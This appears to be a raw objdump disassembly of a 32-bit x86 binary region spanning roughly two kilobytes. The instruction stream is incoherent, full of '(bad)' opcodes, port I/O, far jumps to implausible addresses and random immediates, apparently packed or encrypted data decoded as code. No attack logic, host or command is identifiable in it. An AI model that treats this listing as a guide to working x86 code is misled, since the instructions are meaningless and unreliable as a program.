  4039fe:	push   esi
  4039ff:	push   eax
  403a00:	outs   dx,BYTE PTR ds:[esi]
  403a01:	jns    0x403a4c
  403a03:	xchg   esp,eax
  403a04:	pop    ds
  403a05:	cmp    ch,BYTE PTR [esi]
  403a07:	out    0x12,eax
  403a09:	or     eax,0xfef55d70
  403a0e:	lods   eax,DWORD PTR ds:[esi]
  403a0f:	pop    esi
  403a10:	sbb    al,0x65
  403a12:	xlat   BYTE PTR ds:[ebx]
  403a13:	adc    cl,BYTE PTR [ebx+0x584a3388]
  403a19:	popf   
  403a1a:	dec    eax
  403a1b:	call   0x88d44f54
  403a20:	or     edi,DWORD PTR [edx]
  403a22:	dec    ebx
  403a23:	sbb    ebx,DWORD PTR [ebx+0x70]
  403a26:	call   0xd03f:0x5aef579d
  403a2d:	gs (bad) 
  403a2f:	jb     0x403a86
  403a31:	cmp    DWORD PTR [ebx+0x69],edx
  403a34:	test   al,0x67
  403a36:	repz and BYTE PTR [eax-0x28616340],0x9a
  403a3e:	mov    ch,0x3d
  403a40:	pop    edi
  403a41:	shr    DWORD PTR [ebp-0x1059812c],0xd0
  403a48:	dec    DWORD PTR [ebx-0x3d]
  403a4b:	pop    ebx
  403a4c:	stos   BYTE PTR es:[edi],al
  403a4d:	loope  0x403a62
  403a4f:	xor    DWORD PTR [ecx],edi
  403a51:	jno    0x403ad0
  403a53:	push   esp
  403a54:	stc    
  403a55:	mov    eax,ds:0x5c588725
  403a5a:	retf   0x466d
  403a5d:	call   0xf731:0xa0ea156e
  403a64:	cmp    DWORD PTR [edx+0x2a],0xae5fe8f7
  403a6b:	mov    ebp,0x867ae921
  403a70:	das    
  403a71:	sbb    al,0xa
  403a73:	xor    dl,bh
  403a75:	fs gs dec esi
  403a78:	lea    edi,[ecx-0x349de0bb]
  403a7e:	jg     0x403ab3
  403a80:	(bad)  
  403a81:	retf   
  403a82:	xor    bl,BYTE PTR ds:0x5ae76344
  403a88:	dec    eax
  403a89:	mov    esp,0x3106d39f
  403a8e:	daa    
  403a8f:	in     eax,0x41
  403a91:	(bad)  
  403a92:	(bad)  
  403a93:	jl     0x403ac1
  403a95:	sub    edi,DWORD PTR [edi]
  403a97:	(bad)  
  403a98:	lods   al,BYTE PTR ds:[esi]
  403a99:	push   0xffffffd2
  403a9b:	jecxz  0x403a5d
  403a9d:	or     DWORD PTR [esi],ebx
  403a9f:	and    al,0xc7
  403aa1:	dec    esi
  403aa2:	push   cs
  403aa3:	mov    ebp,0xeca55ffe
  403aa8:	jmp    0xefc146b0
  403aad:	(bad)  
  403aae:	dec    esi
  403ab0:	lds    ecx,FWORD PTR es:[ebx+edx*2-0x6f500fe3]
  403ab8:	or     al,0x3f
  403aba:	lock adc DWORD PTR [esi+edi*8],0x7d
  403abf:	xchg   ebp,eax
  403ac0:	outs   dx,BYTE PTR ds:[esi]
  403ac1:	aad    0xe6
  403ac3:	dec    BYTE PTR [eax]
  403ac5:	test   DWORD PTR [esi+0x9c03527],esp
  403acb:	jns    0x403a75
  403acd:	iret   
  403ace:	lods   al,BYTE PTR ds:[esi]
  403acf:	and    eax,0x715cd6d8
  403ad4:	sub    ecx,DWORD PTR [ecx-0x40aa3b86]
  403ada:	xchg   edx,eax
  403adb:	jno    0x403b1b
  403add:	fdivr  st(4),st
  403adf:	in     al,dx
  403ae0:	aad    0x25
  403ae2:	cmp    al,0x83
  403ae4:	mov    dh,0x1b
  403ae6:	cli    
  403ae7:	sbb    DWORD PTR [ecx+0x1f5c70bc],ecx
  403aed:	repnz sar DWORD PTR [esi],1
  403af0:	cdq    
  403af1:	out    0x26,eax
  403af3:	nop
  403af4:	xchg   esi,eax
  403af5:	inc    edx
  403af6:	mov    ds:0xa9708963,eax
  403afb:	dec    esp
  403afc:	enter  0x8699,0x80
  403b00:	retf   0x6d33
  403b03:	sub    bh,BYTE PTR [esp+edx*8]
  403b06:	mov    esi,DWORD PTR gs:[edx+eax*8]
  403b0a:	mov    al,0x5c
  403b0c:	inc    esp
  403b0d:	icebp  
  403b0e:	xor    ecx,ebx
  403b10:	xchg   ebx,eax
  403b11:	pop    eax
  403b12:	dec    esi
  403b13:	and    edx,esi
  403b15:	mov    ebx,0x24d17b4f
  403b1a:	jge    0x403aa3
  403b1c:	jno    0x403ab1
  403b1e:	and    al,0xa0
  403b20:	in     eax,0x9b
  403b22:	push   ds
  403b23:	test   al,ch
  403b25:	mul    DWORD PTR [esi]
  403b27:	add    al,0x3e
  403b29:	(bad)  
  403b2a:	call   0xd94e8763
  403b2f:	jae    0x403b8a
  403b31:	ins    BYTE PTR es:[edi],dx
  403b32:	mov    dh,0x7d
  403b34:	jno    0x403b4f
  403b36:	arpl   WORD PTR [eax],di
  403b38:	jae    0x403ada
  403b3a:	jmp    0x5336bc91
  403b3f:	outs   dx,DWORD PTR ds:[esi]
  403b40:	push   esi
  403b41:	clc    
  403b42:	pop    ebx
  403b43:	inc    eax
  403b44:	int3   
  403b45:	xchg   DWORD PTR [ebx+eax*4],ecx
  403b48:	xchg   BYTE PTR ss:[edx+0x43],ch
  403b4c:	icebp  
  403b4d:	cmovbe esi,DWORD PTR [ebp-0x5f7d15]
  403b54:	xchg   ecx,eax
  403b55:	ja     0x403b8a
  403b57:	push   0x60
  403b59:	push   esi
  403b5a:	xchg   edi,eax
  403b5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b5c:	sub    cl,BYTE PTR [ecx+0xd]
  403b5f:	call   0x49af5569
  403b64:	test   BYTE PTR [ecx-0x42a69976],bh
  403b6a:	push   cs
  403b6b:	mov    edi,0xce7dfc36
  403b70:	cmc    
  403b71:	xchg   BYTE PTR [esi-0x24],bl
  403b74:	adc    ah,BYTE PTR [ebx-0x66]
  403b77:	push   ecx
  403b78:	imul   edx,DWORD PTR [ecx],0xffffffc4
  403b7b:	sbb    esp,DWORD PTR [ebp-0x7891ca3a]
  403b81:	test   eax,0x2c096862
  403b86:	(bad)  
  403b87:	into   
  403b88:	jno    0x403b55
  403b8a:	js     0x403b1e
  403b8c:	fimul  DWORD PTR [edx+0x4d]
  403b8f:	mov    eax,ds:0x12ef0887
  403b94:	adc    al,0x77
  403b96:	push   esp
  403b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b98:	xchg   BYTE PTR [esi],cl
  403b9a:	mov    al,ds:0xc422b2d0
  403b9f:	xor    DWORD PTR [edi*8-0x44ec0875],eax
  403ba6:	jo     0x403bb3
  403ba8:	pop    esi
  403ba9:	scas   al,BYTE PTR es:[edi]
  403baa:	fnstsw WORD PTR [esi]
  403bac:	gs mov dh,0x35
  403baf:	cmp    DWORD PTR [esi+ebp*8+0x19],esi
  403bb3:	xchg   edi,eax
  403bb4:	fild   QWORD PTR [ecx]
  403bb6:	lods   eax,DWORD PTR ds:[esi]
  403bb7:	fs push ebp
  403bb9:	ror    BYTE PTR [ebx],1
  403bbb:	mov    bh,0x84
  403bbd:	clc    
  403bbe:	adc    eax,0x66d556fa
  403bc3:	imul   eax,DWORD PTR [ebx+0x2ec4a837],0x15
  403bca:	outs   dx,BYTE PTR ds:[esi]
  403bcb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403bcc:	mov    eax,ds:0x65f370e9
  403bd1:	jmp    0x403bc4
  403bd3:	sbb    BYTE PTR [edi],dh
  403bd5:	(bad)  
  403bd7:	rcl    BYTE PTR [edx+0x72],1
  403bda:	jbe    0x403b8c
  403bdc:	xor    al,0x77
  403bde:	repz xchg edx,eax
  403be0:	popf   
  403be1:	jp     0x403bbd
  403be3:	jl     0x403baa
  403be5:	ja     0x403c4e
  403be7:	jne    0x403b79
  403be9:	push   0xa
  403beb:	mov    fs,WORD PTR [ecx-0x5f]
  403bee:	mov    al,0x36
  403bf0:	lds    esi,FWORD PTR [edx]
  403bf2:	pop    eax
  403bf3:	les    ecx,FWORD PTR [ecx-0x1af1f0a9]
  403bf9:	ror    BYTE PTR [edi],0xb6
  403bfc:	jg     0x403c3d
  403bfe:	enter  0x703d,0x83
  403c02:	gs inc esp
  403c04:	adc    BYTE PTR [esi-0x6a],bh
  403c07:	ss arpl dx,di
  403c0a:	cwde   
  403c0b:	int    0xe4
  403c0d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c0e:	mov    BYTE PTR [ecx],bh
  403c10:	fcom   DWORD PTR [eax+eax*8]
  403c13:	jbe    0x403c01
  403c15:	sbb    al,0x62
  403c17:	jle    0x403bc3
  403c19:	xchg   edi,eax
  403c1a:	es pusha 
  403c1c:	xchg   edi,eax
  403c1d:	shl    DWORD PTR [ebp+0x3e],1
  403c20:	inc    edx
  403c21:	mov    gs,ebp
  403c23:	jbe    0x403bd4
  403c25:	nop
  403c26:	in     eax,dx
  403c27:	sbb    al,0x52
  403c29:	imul   edi,DWORD PTR [edx+0xa],0x5fbb39af
  403c30:	dec    esi
  403c31:	push   ds
  403c32:	xor    BYTE PTR ds:[esi],0x1
  403c36:	fs mov dl,0xb3
  403c39:	pop    edx
  403c3a:	sbb    ebp,edx
  403c3c:	xor    al,0x39
  403c3f:	cmp    ebp,DWORD PTR [ebx+0x4f]
  403c42:	cdq    
  403c43:	jb     0x403ca3
  403c45:	adc    al,0x69
  403c47:	in     al,0x99
  403c49:	call   0x49f4:0x1093aef0
  403c50:	lods   eax,DWORD PTR ds:[esi]
  403c51:	dec    eax
  403c52:	jno    0x403c51
  403c54:	iret   
  403c55:	xchg   ecx,eax
  403c56:	(bad)  
  403c57:	loop   0x403ca1
  403c59:	push   ds
  403c5a:	jmp    0x2ebe:0xdd9076b2
  403c61:	inc    ebx
  403c62:	outs   dx,DWORD PTR ds:[esi]
  403c63:	cwde   
  403c64:	icebp  
  403c65:	push   ebx
  403c66:	popa   
  403c67:	push   ebx
  403c68:	cwde   
  403c69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c6a:	clc    
  403c6b:	jmp    0x6130:0x124bb96e
  403c72:	outs   dx,DWORD PTR ds:[esi]
  403c73:	daa    
  403c74:	sbb    DWORD PTR [edi-0x10],esp
  403c77:	mov    esp,0xf37176af
  403c7c:	ror    DWORD PTR [ebx],1
  403c7e:	into   
  403c7f:	or     DWORD PTR [ebp*1-0x102bc615],eax
  403c86:	retf   
  403c87:	mul    BYTE PTR [ebp+0x14]
  403c8a:	jno    0x403c64
  403c8c:	cmp    al,0x6d
  403c8e:	shl    BYTE PTR [esi-0x37],1
  403c91:	pusha  
  403c92:	push   0xa878010b
  403c97:	lods   al,BYTE PTR ds:[esi]
  403c98:	lock jp 0x403d03
  403c9b:	pop    ss
  403c9c:	sub    eax,DWORD PTR [edi+ecx*4+0x5d]
  403ca0:	iret   
  403ca1:	sub    al,0xdc
  403ca3:	(bad)  [eax]
  403ca5:	ret    0x54e
  403ca8:	xchg   ebx,edi
  403caa:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cac:	rcl    BYTE PTR [edx+0x7f],1
  403caf:	push   0xffffffb4
  403cb1:	sbb    ecx,DWORD PTR [ebx]
  403cb3:	test   BYTE PTR [eax+ebp*1],dh
  403cb6:	or     edx,DWORD PTR [edx-0x45db1aac]
  403cbc:	aad    0x3e
  403cbe:	rep stos BYTE PTR es:[edi],al
  403cc0:	call   0x3cada33c
  403cc5:	xor    eax,DWORD PTR [eax-0x22aaba1b]
  403ccb:	test   eax,0xf6a8fcbc
  403cd0:	imul   ebx,DWORD PTR [eax+0x6b],0xffffffdf
  403cd4:	inc    edx
  403cd5:	inc    edx
  403cd6:	test   cl,dl
  403cd8:	sbb    eax,0x10a2396e
  403cdd:	cdq    
  403cde:	or     DWORD PTR [ebx+0x328d4e32],ecx
  403ce4:	mov    al,0xf3
  403ce6:	inc    esp
  403ce7:	pop    ds
  403ce8:	pushf  
  403ce9:	outs   dx,BYTE PTR ds:[esi]
  403cea:	into   
  403ceb:	sahf   
  403cec:	add    DWORD PTR [edx+0x45],eax
  403cef:	fucomi st,st(5)
  403cf1:	ins    BYTE PTR es:[edi],dx
  403cf2:	adc    eax,0x901a6563
  403cf7:	lahf   
  403cf8:	pop    es
  403cf9:	push   ebx
  403cfa:	cld    
  403cfb:	inc    ebx
  403cfc:	jno    0x403cb5
  403cfe:	dec    esi
  403cff:	jns    0x403d50
  403d01:	outs   dx,DWORD PTR ds:[esi]
  403d02:	sbb    eax,0xe7928b68
  403d07:	push   0xa42cf89b
  403d0c:	in     al,0xe6
  403d0e:	add    al,0x38
  403d10:	sub    ebp,DWORD PTR [esi+0x55875395]
  403d16:	mov    dh,0xd8
  403d18:	inc    edx
  403d19:	or     cl,bh
  403d1b:	ds xor eax,0x45ac0863
  403d21:	mov    esi,0x70ac56c5
  403d26:	mov    ds:0x445ef860,eax
  403d2b:	jns    0x403cfc
  403d2d:	lahf   
  403d2e:	cmp    bl,BYTE PTR [edx-0x2e27357c]
  403d34:	or     dl,BYTE PTR [edx+0x7]
  403d37:	dec    ebp
  403d38:	mov    eax,DWORD PTR ds:0xca3b4261
  403d3e:	or     al,0x2c
  403d40:	mov    bh,BYTE PTR [edi+0x6a]
  403d43:	arpl   WORD PTR [edx+0x1de2fcbc],dx
  403d49:	push   edx
  403d4a:	mov    ebp,0xa9178ebe
  403d4f:	sbb    al,dl
  403d51:	imul   edx,DWORD PTR [edi-0x3174c926],0x3973f20
  403d5b:	ret    
  403d5c:	dec    ebx
  403d5d:	mov    BYTE PTR [ebx+0x3],al
  403d60:	mov    ebx,0x510c2d5d
  403d65:	cdq    
  403d66:	pop    edi
  403d67:	pop    esp
  403d68:	imul   eax,DWORD PTR [ecx+0x5bfda344],0xffffffe5
  403d6f:	sbb    DWORD PTR [esi+ecx*8],ebx
  403d72:	fild   DWORD PTR [eax+0x5f]
  403d75:	verw   WORD PTR [ecx+0x5aa7cd3e]
  403d7c:	xchg   DWORD PTR [edi-0x36],esp
  403d7f:	jl     0x403dc0
  403d81:	retf   0x5e73
  403d84:	mov    dl,0x86
  403d86:	mov    bl,0x2
  403d88:	clc    
  403d89:	repnz cwde 
  403d8b:	sbb    edx,eax
  403d8d:	xchg   edi,eax
  403d8e:	cmc    
  403d8f:	lahf   
  403d90:	ins    BYTE PTR es:[edi],dx
  403d91:	ret    
  403d92:	inc    esi
  403d93:	in     eax,dx
  403d94:	lahf   
  403d95:	adc    BYTE PTR ds:0xf1d32ce9,cl
  403d9b:	push   ss
  403d9c:	sbb    edi,DWORD PTR [ebx]
  403d9e:	fisttp WORD PTR [eax+0x59]
  403da1:	fnstenv ds:0xa3309086
  403da7:	xor    BYTE PTR [ebx],0xc0
  403daa:	sub    DWORD PTR ds:0x422952,0x1af
  403db4:	or     eax,ecx
  403db6:	not    DWORD PTR ds:0x4229b6
  403dbc:	jmp    0x404346
  403dc1:	ss jp  0x403deb
  403dc4:	cmp    bl,BYTE PTR [ebx]
  403dc6:	sbb    ch,BYTE PTR [edx]
  403dc8:	pop    edx
  403dc9:	pop    es
  403dca:	scas   al,BYTE PTR es:[edi]
  403dcb:	and    ch,BYTE PTR [eax-0x56]
  403dce:	sbb    DWORD PTR [esi-0x4e],0x58
  403dd2:	lds    edx,FWORD PTR [esi]
  403dd4:	push   ss
  403dd5:	cmp    eax,0x69161604
  403dda:	psubsb mm4,mm7
  403ddd:	ja     0x403db3
  403ddf:	(bad)  
  403de0:	stos   BYTE PTR es:[edi],al
  403de1:	stc    
  403de2:	pop    edx
  403de3:	sahf   
  403de4:	outs   dx,BYTE PTR ds:[esi]
  403de5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403de6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403de7:	popa   
  403de8:	push   edx
  403de9:	inc    edi
  403dea:	add    DWORD PTR [eax-0x767033a7],edi
  403df0:	ret    
  403df1:	xchg   edi,eax
  403df2:	out    dx,al
  403df3:	into   
  403df4:	mov    esi,0x6f7818d3
  403df9:	in     al,0x14
  403dfb:	mov    ebp,0xa4e6d361
  403e00:	aam    0xe0
  403e02:	mov    dh,BYTE PTR [ecx+0xf]
  403e05:	out    dx,eax
  403e06:	ds pop esi
  403e08:	ds sbb al,0x3f
  403e0b:	mov    al,ds:0x4dc516ef
  403e10:	in     eax,dx
  403e11:	scas   eax,DWORD PTR es:[edi]
  403e12:	jl     0x403df3
  403e14:	into   
  403e15:	ja     0x403df7
  403e17:	mov    ah,0x51
  403e19:	add    bh,BYTE PTR [edi]
  403e1b:	(bad)  
  403e1c:	jns    0x403dd5
  403e1e:	adc    al,0x33
  403e20:	retf   0xa8b2
  403e23:	repnz and bh,BYTE PTR [eax-0x77]
  403e27:	fst    DWORD PTR [edx-0x32]
  403e2a:	sub    al,al
  403e2c:	xor    ch,bl
  403e2e:	lods   eax,DWORD PTR ds:[esi]
  403e2f:	and    dl,BYTE PTR [edx+edi*2+0x7d63dfa]
  403e36:	loop   0x403eae
  403e38:	in     eax,0xfd
  403e3a:	xchg   edx,eax
  403e3b:	push   ds
  403e3c:	lahf   
  403e3d:	ins    DWORD PTR es:[edi],dx
  403e3e:	call   0xbb6c4674
  403e43:	loop   0x403dc9
  403e45:	int3   
  403e46:	in     al,0xaf
  403e48:	push   ebx
  403e49:	inc    esi
  403e4a:	(bad)  [ebp+edx*8+0x13d80c4c]
  403e51:	out    dx,eax
  403e52:	loope  0x403e68
  403e54:	mov    eax,0x9634f006
  403e59:	dec    ebx
  403e5a:	jnp    0x403e01
  403e5c:	sbb    al,0x45
  403e5e:	cmp    eax,0xc18b112e
  403e63:	and    esi,eax
  403e65:	sub    ecx,DWORD PTR [esi+ebx*1-0x3d5444c3]
  403e6c:	jp     0x403e31
  403e6e:	fbld   TBYTE PTR [ecx]
  403e70:	xchg   ebx,eax
  403e71:	jg     0x403e74
  403e73:	pop    esp
  403e74:	vorps  ymm5,ymm6,YMMWORD PTR [edi+0x3c]
  403e79:	xor    esp,0xffffff8b
  403e7c:	pop    edx
  403e7d:	lods   al,BYTE PTR ds:[esi]
  403e7e:	ins    DWORD PTR es:[edi],dx
  403e7f:	scas   al,BYTE PTR es:[edi]
  403e80:	lea    ecx,[edi-0x353159be]
  403e86:	mov    ds:0xa4c7d758,al
  403e8b:	clc    
  403e8c:	mov    ss,ecx
  403e8e:	int    0xfc
  403e90:	daa    
  403e91:	xchg   edi,eax
  403e92:	out    dx,eax
  403e93:	sub    eax,0xc902579a
  403e98:	cmc    
  403e99:	adc    eax,0x3439ac4d
  403e9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403e9f:	pop    edx
  403ea0:	sbb    ecx,edx
  403ea2:	ins    BYTE PTR es:[edi],dx
  403ea3:	or     DWORD PTR [ecx],esp
  403ea5:	push   edi
  403ea6:	loop   0x403ebc
  403ea8:	jo     0x403e7b
  403eaa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403eab:	or     BYTE PTR [edx],0x9e
  403eae:	lods   al,BYTE PTR ds:[esi]
  403eaf:	inc    esp
  403eb0:	xchg   ecx,eax
  403eb1:	pop    esi
  403eb2:	dec    esp
  403eb3:	or     eax,0xdc3a2687
  403eb8:	and    eax,0x4dc43da2
  403ebd:	test   DWORD PTR [ecx],0x1ef5be81
  403ec3:	es jne 0x403e82
  403ec6:	xor    eax,0x635ffdba
  403ecb:	add    ch,cl
  403ecd:	push   0x6051cef
  403ed2:	clc    
  403ed3:	clc    
  403ed4:	sbb    al,0xe8
  403ed6:	add    ah,dl
  403ed8:	dec    ebx
  403ed9:	ret    0xa11e
  403edc:	sub    cl,BYTE PTR [edx+0x73]
  403edf:	std    
  403ee0:	sahf   
  403ee1:	pushw  cs
  403ee3:	lea    esp,[edi-0x65abccbe]
  403ee9:	adc    ebp,DWORD PTR [edx]
  403eeb:	rcr    edi,cl
  403eed:	pop    eax
  403eee:	pop    esi
  403eef:	push   ecx
  403ef0:	jp     0x403f54
  403ef2:	fs es (bad) 
  403ef5:	cmp    BYTE PTR [ecx+0x66],bh
  403ef8:	sub    al,0x4f
  403efa:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  403efc:	clc    
  403efd:	inc    ecx
  403efe:	ins    DWORD PTR es:[edi],dx
  403eff:	lds    eax,FWORD PTR [ecx-0x65063cb3]
  403f05:	aam    0xb
  403f07:	push   ebp
  403f08:	jecxz  0x403e8b
  403f0a:	fdiv   QWORD PTR [edi-0x19]
  403f0d:	xor    ebp,DWORD PTR [ebx+0x15]
  403f10:	inc    edi
  403f11:	sar    DWORD PTR [esi+0x38],1
  403f14:	clc    
  403f15:	imul   esi,ebp,0x2240c55
  403f1b:	je     0x403f82
  403f1d:	or     eax,eax
  403f1f:	into   
  403f20:	cs xchg ebp,eax
  403f22:	test   DWORD PTR [ebp+0x56],edi
  403f25:	push   0x54
  403f27:	mov    eax,ds:0x47be2a45
  403f2c:	cmp    eax,0xd3bef81
  403f31:	sahf   
  403f32:	retf   0x44af
  403f35:	jne    0x403f9c
  403f37:	and    al,cl
  403f39:	pop    ds
  403f3a:	xlat   BYTE PTR ds:[ebx]
  403f3b:	idiv   ecx
  403f3d:	es cld 
  403f3f:	arpl   WORD PTR gs:[esi+0x4b],sp
  403f43:	add    eax,0xc631f7c
  403f48:	getsec 
  403f4a:	rol    BYTE PTR [edx+ecx*2-0x1f],cl
  403f4e:	mov    edi,0x5ebbd599
  403f53:	push   edi
  403f54:	xchg   ebp,eax
  403f55:	adc    dh,dl
  403f57:	push   cs
  403f58:	mov    bl,BYTE PTR [ecx+0x21a9f4b7]
  403f5e:	mov    bl,BYTE PTR [ebx+0x6fc3a415]
  403f64:	ficomp DWORD PTR [ebx-0x30294500]
  403f6a:	stos   DWORD PTR es:[edi],eax
  403f6b:	sub    DWORD PTR [esi+0x8c82e67],0x67
  403f72:	leave  
  403f73:	dec    esp
  403f74:	sub    al,BYTE PTR [esi]
  403f76:	mov    al,ds:0xc9ce8bd1
  403f7b:	fst    QWORD PTR [ebx-0x39c1b41d]
  403f81:	push   eax
  403f82:	mov    cs,esp
  403f84:	fstp   st(6)
  403f86:	mov    ebx,0xf0be099d
  403f8b:	fs push 0xfffffff8
  403f8e:	sar    BYTE PTR [edx+ebp*4-0x45640be6],cl
  403f95:	push   ebp
  403f96:	jno    0x403f9d
  403f98:	rcl    DWORD PTR ds:0xae84107a,0x7c
  403f9f:	inc    ebp
  403fa0:	scas   al,BYTE PTR es:[edi]
  403fa1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403fa2:	imul   esp,DWORD PTR [ebp-0x6bbcb0fc],0x24f2903d
  403fac:	mov    BYTE PTR [esi],dl
  403fae:	in     eax,dx
  403faf:	stos   DWORD PTR es:[edi],eax
  403fb0:	xor    al,0xa1
  403fb2:	inc    eax
  403fb3:	fisttp QWORD PTR [ecx-0x4e104ad5]
  403fb9:	fdiv   QWORD PTR [edx+0x23548dcb]
  403fbf:	adc    BYTE PTR [esi+0x75],ah
  403fc2:	or     BYTE PTR ds:[esi],dh
  403fc5:	jmp    0x403fb7
  403fc7:	inc    eax
  403fc8:	xor    ecx,DWORD PTR [edx-0x771a1dba]
  403fce:	cmp    DWORD PTR [esi+ebp*4],ecx
  403fd1:	(bad)  
  403fd4:	jle    0x403f66
  403fd6:	mov    eax,ds:0x268bc1b8
  403fdb:	jmp    0x40401e
  403fdd:	sub    ah,BYTE PTR [ecx-0x69c8c7d1]
  403fe3:	cld    
  403fe4:	mov    ecx,0x9a6d2ada
  403fe9:	xchg   ebx,eax
  403fea:	or     edx,DWORD PTR [ebp-0x399708b2]
  403ff0:	pushf  
  403ff1:	(bad)  
  403ff2:	cmc    
  403ff3:	cmp    eax,0x5c306f12
  403ff8:	mov    ss,WORD PTR [edx+0x75d6404e]
  403ffe:	dec    esp
  403fff:	into   
  404000:	ins    DWORD PTR es:[edi],dx
  404001:	jns    0x404043
  404003:	fnstenv [esi+0x60]
  404006:	into   
  404007:	not    DWORD PTR [ecx-0x7e81430d]
  40400d:	(bad)  
  40400e:	int    0x31
  404010:	arpl   sp,ax
  404012:	mov    cl,0x57
  404014:	xor    al,0x2d
  404016:	adc    BYTE PTR [eax+0x4b25483f],bl
  40401c:	sub    edx,DWORD PTR [ebp-0x2e]
  40401f:	scas   al,BYTE PTR es:[edi]
  404020:	jbe    0x404029
  404022:	(bad)  
  404023:	mov    ebx,DWORD PTR [eax-0x3b]
  404026:	mov    al,0x26
  404028:	(bad)  
  404029:	mov    ah,0xc2
  40402b:	inc    ebp
  40402c:	out    dx,eax
  40402d:	arpl   WORD PTR [ecx-0x51],si
  404030:	push   ss
  404031:	adc    al,0x47
  404033:	push   cs
  404034:	mov    eax,0x81c14e58
  404039:	push   ds
  40403a:	nop
  40403b:	lea    esi,[ebx]
  40403d:	mov    ebp,0xc5b60890
  404042:	cmp    bl,0x72
  404045:	push   es
  404046:	dec    ebp
  404047:	pop    ds
  404048:	outs   dx,DWORD PTR ds:[esi]
  404049:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40404a:	sub    ebp,DWORD PTR [ebx+0x37]
  40404d:	xchg   edx,eax
  40404e:	push   cs
  40404f:	out    dx,al
  404050:	clc    
  404051:	dec    ebp
  404052:	dec    ebp
  404053:	add    bl,BYTE PTR [edi-0x6d]
  404056:	(bad)  
  404057:	gs add eax,0xaba2473f
  40405d:	sar    BYTE PTR [ebx],0xa
  404060:	mov    ebp,0x7f1bfd80
  404065:	cld    
  404066:	jmp    0x40401f
  404068:	add    BYTE PTR ds:0x503efde1,bh
  40406e:	aam    0xc2
  404070:	ror    BYTE PTR [edx],cl
  404072:	xchg   BYTE PTR [edx],dh
  404074:	add    DWORD PTR [edx+0x6d9483a8],0xffffff91
  40407b:	mov    ds:0x5f1b7f63,al
  404080:	cli    
  404081:	lds    eax,FWORD PTR [esi]
  404083:	inc    ebp
  404084:	pop    ss
  404085:	(bad)  
  404086:	and    edx,DWORD PTR [esp+edi*2-0x63]
  40408a:	xor    al,0x48
  40408c:	cli    
  40408d:	push   ebp
  40408e:	popf   
  40408f:	out    0xaf,al
  404091:	adc    DWORD PTR [esi+0x2bf9916],ebx
  404097:	push   ds
  404098:	in     al,dx
  404099:	cmp    DWORD PTR [ebp-0x23],esp
  40409c:	xchg   edx,eax
  40409d:	jns    0x40407d
  40409f:	clc    
  4040a0:	cmp    al,0x27
  4040a2:	jg     0x40402b
  4040a4:	lock cmp edi,0x13
  4040a8:	fdecstp 
  4040aa:	mov    edx,ebx
  4040ac:	or     dh,BYTE PTR [eax]
  4040ae:	adc    DWORD PTR ds:[ebp+0x6f],ebx
  4040b2:	xchg   edi,eax
  4040b3:	jb     0x404046
  4040b5:	and    BYTE PTR [esi+0x29],cl
  4040b8:	pop    ss
  4040b9:	cli    
  4040ba:	and    eax,0xa27a6cd0
  4040bf:	cmp    al,0x15
  4040c1:	or     bl,BYTE PTR ds:0x44a2173f
  4040c7:	inc    edi
  4040c8:	mov    al,ss:0x2cbe1773
  4040ce:	jns    0x4040cf
  4040d0:	add    dh,al
  4040d2:	mov    ds:0xd8bc7f6b,al
  4040d7:	jmp    0x3c46:0xeae5dc04
  4040de:	jp     0x40414b
  4040e0:	fimul  DWORD PTR [ecx+0x43]
  4040e3:	loope  0x40411c
  4040e5:	sar    DWORD PTR [esi+0x1f],1
  4040e8:	ja     0x4040a1
  4040ea:	sbb    BYTE PTR [edx+0x24],ch
  4040ed:	enter  0x7b58,0xd5
  4040f1:	mov    al,ds:0xf574849c
  4040f6:	jb     0x4040bb
  4040f8:	adc    DWORD PTR [ecx],eax
  4040fa:	in     al,dx
  4040fb:	aad    0x18
  4040fd:	arpl   WORD PTR [ebx+ebp*4+0x66],dx
  404101:	add    BYTE PTR [ebp-0x59520bec],0xaa
  404108:	xlat   BYTE PTR ds:[ebx]
  404109:	sbb    BYTE PTR [ebx+0x3fe73652],dh
  40410f:	xchg   BYTE PTR [esi],ah
  404111:	(bad)
  404114:	sub    eax,0xc026647
  404119:	js     0x404118
  40411b:	retf   0x5a67
  40411e:	leave  
  40411f:	push   edx
  404120:	sti    
  404121:	mov    edx,0x20afebb5
  404126:	adc    DWORD PTR [ebx+0x38],edx
  404129:	pop    esp
  40412a:	repnz out dx,al
  40412c:	int3   
  40412d:	(bad)  
  40412e:	mov    eax,ds:0xac81fdd5
  404133:	daa    
  404134:	inc    esp
  404135:	or     dh,BYTE PTR [edx]
  404137:	push   esi
  404138:	add    ebx,DWORD PTR [edx+edi*1-0x417f8e30]
  40413f:	sahf   
  404140:	jg     0x404175
  404142:	sub    BYTE PTR [ebx+0x58c4ac77],bh
  404148:	sbb    al,0xd3
  40414a:	inc    ebp
  40414b:	dec    ebx
  40414c:	xchg   ebx,eax
  40414d:	into   
  40414e:	daa    
  40414f:	mov    ebx,0x5768f89e
  404154:	pop    ecx
  404155:	js     0x404134
  404157:	add    al,0x6b
  404159:	nop
  40415a:	cmp    eax,0x122601cf
  40415f:	rcr    BYTE PTR [ebp-0x616f2a47],cl
  404165:	jmp    0x40416b
  404167:	mov    ds:0x9a363089,eax
  40416c:	loop   0x404108
  40416e:	cmp    eax,0x3eb23051
  404173:	jp     0x4041de
  404175:	ds in  al,dx
  404177:	or     ecx,edi
  404179:	cld    
  40417a:	fistp  QWORD PTR [esi+0x7a]
  40417d:	xor    BYTE PTR [eax+edx*1+0x6a],cl
  404181:	mov    ecx,0x6f4467c
  404186:	adc    DWORD PTR ds:0x88e5bc65,esp
  40418c:	sub    BYTE PTR [ebp-0x3a44b65a],bh
  404192:	lock psrad mm7,QWORD PTR [edi+0x1e2c0c9d]
  40419a:	retf   
  40419b:	pop    eax
  40419c:	xor    BYTE PTR [ebx-0x31dbfb],0xda
  4041a3:	mov    eax,ds:0x72cad40d
  4041a8:	icebp  
